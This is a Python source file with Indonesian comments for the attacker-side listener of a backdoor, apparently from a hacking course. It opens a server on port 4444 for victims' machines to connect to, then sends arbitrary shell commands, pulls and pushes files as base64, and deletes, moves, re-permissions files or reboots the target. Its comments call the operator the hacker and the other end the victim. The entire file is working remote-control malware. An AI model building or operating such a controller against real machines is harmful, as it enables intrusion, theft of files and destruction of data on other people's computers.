import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        # [LANGKAH 1] INISIALISASI LISTENER (SERVER)
        # LISTENER BERFUNGSI UNTUK MENUNGGU KONEKSI MASUK, MENUNGGU DATA DATANG, 
        # DAN MENGIRIM PERINTAH
        print("[DEBUG] [LANGKAH 1] MEMBUAT SOCKET LISTENER")
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # UNTUK MENSTABILKAN KONEKSI JARINGAN ATAU REUSEABLE KETIKA KONEKSI PUTUS ATAU DROP
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # BIND UNTUK MENENTUKAN ALAMAT DAN PORT
        listener.bind((ip, port))
        
        # MEMBUAT BACKLOG, JUMLAH KAPASITAS RUANG TUNGGU (PENDING CONNECTION) DI SISTEM OPERASI
        listener.listen(0)

        print("[DEBUG] [+] LISTENING: MENUNGGU KONEKSI JARINGAN DARI KORBAN DATANG...")
        
        # [LANGKAH 3] SERVER MENERIMA KONEKSIs
        # ACCEPT() AKAN MEMBLOKIR/MENUNGGU SAMPAI ADA BACKDOOR YANG CONNECT (LANGKAH 2 DI SCRIPT BACKDOOR)
        self.connection, address = listener.accept()
        print(f"[DEBUG] [LANGKAH 3] [+] MENDAPATKAN KONEKSI DARI {str(address)}")

    def reliable_send(self, data):
        # [LANGKAH 5] MENGUBAH PERINTAH MENJADI JSON DAN MENGIRIMKANNYA KE KORBAN
        print("[DEBUG] [LANGKAH 5] HACKER MENGIRIM DATA (JSON) :", data)
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        # [LANGKAH 9] MENERIMA HASIL EKSEKUSI DARI KORBAN
        print("[DEBUG] MENUNGGU BALASAN DARI KORBAN...")
        json_data = ""
        while True:
            try:
                chunk = self.connection.recv(1024)
                
                # [DETEKSI] JIKA HACKER MATI, CHUNK AKAN KOSONG
                if not chunk: 
                    raise Exception("Koneksi Putus")
                
                # print("[DEBUG] HACKER RECV RAW : ", chunk) # OPSI JIKA INGIN MELIHAT DATA MENTAH
                json_data += chunk.decode()
                print("[DEBUG] HACKER MENERIMA JSON STRING :", json_data)
                return json.loads(json_data)
            except ValueError:
                # JSON BELUM LENGKAP MAKA LANJUT TERIMA DATA (LOOP)
                continue 

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def download_file(self, path, data):
        # DATA ADALAH BASE64 STRING
        print("\n[DEBUG] START DECODE FILE (BASE64) UNTUK DOWNLOAD")

        try:
            file_data = base64.b64decode(data)
        except Exception as e:
            return "[ERROR] GAGAL DECODE BASE64 : " + str(e)

        try:
            with open(path, "wb") as file:
                file.write(file_data)
        except Exception as e:
            return "[ERROR] GAGAL MENYIMPAN FILE : " + str(e)

        return "[+] DOWNLOAD BERHASIL"
        
    def read_file(self, path):
        # MEMBACA FILE DAN MENGUBAH KE BASE64 AGAR BISA DIKIRIM MELALUI JSON (UPLOAD)
        print("\n[DEBUG] START READ FILE (BASE64) UNTUK UPLOAD")

        with open(path, "rb") as file:
            file_data = file.read()

        encoded = base64.b64encode(file_data).decode()
        print("[DEBUG] BASE64 ENCODE SELESAI")

        return encoded

    def run(self):
        while True:
            # SERVER MEMINTA INPUT DARI HACKER
            print("\n[DEBUG] [LANGKAH 4] MENUNGGU INPUT PERINTAH DARI HACKER...")
            command = input(">> ")
            if not command:
                continue
            
            command = command.split(" ")

            if command[0] == "exit":
                self.reliable_send(command)
                print(f"[DEBUG] {command[0]} DIKIRIM KE KLIEN")
                self.connection.close()
                print("[DEBUG] KONEKSI DITUTUP")
                break
            
            elif command[0] == "reboot":
                print(f"[DEBUG] MENGIRIM INSTRUKSI REBOOT KE TARGET...")
                
                # MENGIRIM PERINTAH DAN MENERIMA PESAN KONFIRMASI DARI BACKDOOR
                result = self.execute_remotely(command)
                print(f"\n{result}")
                
                # MENUTUP SOCKET DI SISI LISTENER KARENA TARGET AKAN RESTART
                self.connection.close()
                break
            
            elif command[0] == "shutdown_backdoor":
                print("[DEBUG] MENGIRIM 'shutdown_backdoor'")
                
                result = self.execute_remotely(command)
                self.connection.close()
                print(result)
                break
            
            # PERINTAH UNTUK MENGUBAH IZIN AKES USER PADA SUATU FILE
            elif command[0] == "chmod":
                if len(command) < 3:
                    print("[-] PENGGUNAAN: chmod <read(r)/write(w)/execute(x)> <nama_file.jenis_file>")
                    print("[-] ALTERNATIF PENGGUNAAN: chmod <angka_mode> <nama_file>")
                    continue
                    
                print(f"[DEBUG] MENGIRIM PERINTAH : {command}")
                result = self.execute_remotely(command)
            
            # PERINTAH CUSTOM UNTUK DELETE FILE DAN DELETE FILE PAKSA    
            elif command[0] == "rm":
                print(f"[DEBUG] MENGIRIM PERINTAH HAPUS KE KORBAN: {' '.join(command)}")
                result = self.execute_remotely(command)
                
            # PERINTAH CUSTOM UNTUK PINDAH ATAU RENAME FILE
            elif command[0] == "mv":
                # CEK APAKAH ARGUMEN LENGKAP (MV <ASAL> <TUJUAN>)
                if len(command) < 3:
                    print("[-] PENGGUNAAN: mv <sumber> <tujuan>")
                    continue
                
                print(f"[DEBUG] MENGIRIM PERINTAH MV: {command[1]} KE {command[2]}")
                
                # KIRIM PERINTAH DAN TUNGGU BALASAN DARI KORBAN
                result = self.execute_remotely(command)
            
            elif command[0] == "download":
                self.reliable_send(command)
                result = self.reliable_receive()

                if isinstance(result, str) and result.startswith("[ERROR]"):
                    print(result)
                    continue

                result = self.download_file(command[1], result)
                
            elif command[0] == "upload":
                try:
                    file_content = self.read_file(command[1])
                except Exception as e:
                    print("[ERROR] GAGAL MEMBACA FILE :", e)
                    continue

                command.append(file_content)
                result = self.execute_remotely(command)

                if isinstance(result, str) and result.startswith("[ERROR]"):
                    print(result)
                    continue
                    
            else:
                # UNTUK PERINTAH BIASA (SELAIN EXIT, UPLOAD, DOWNLOAD)
                result = self.execute_remotely(command)

            # [LANGKAH 10] MENAMPILKAN HASIL AKHIR KE LAYAR HACKER
            print("[DEBUG] MENAMPILKAN HASIL EKSEKUSI DARI KORBAN")
            print("\n[RESULT]\n", result)

# GANTI IP SESUAI DENGAN IP KALI LINUX / MESIN PENYERANG ANDA
my_listener = Listener("220.220.220.11", 4444)
my_listener.run()